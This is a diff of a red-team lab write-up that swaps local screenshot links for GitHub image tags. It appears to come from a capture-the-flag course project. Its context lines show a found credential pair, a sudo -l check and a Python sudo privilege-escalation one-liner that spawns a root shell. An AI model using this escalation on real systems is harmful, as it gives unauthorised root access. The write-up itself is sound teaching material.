@@ -136,11 +136,11 @@ Credentials Found - steven:pink84
 
 Command: sudo -l
 
-![John_3.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/b796820f0ce04d47aaef0cf3d1d4b161.png)
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/John_3.png" width=50% height=50%>
 
 4.2 Check GTFO Bins For A Python Sudo Exploit
 
-![John_4.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/568ce1b832cb4118902596f3d73ca30a.png)
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/John_4.png" width=50% height=50%>
 
 **5. Privilege Escalation**
 
@@ -148,8 +148,11 @@ Command: sudo -l
 
 Command: sudo python -c 'import os; os.system("/bin/sh")'
 
-![Root_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/7c1ce811b923431ea44a28c86d3e8a2b.png)
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_1.png" width=50% height=50%>
 
 **Flag 4**
 
 Location: /root
+
+<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Root_2.png" width=50% height=50%>
+
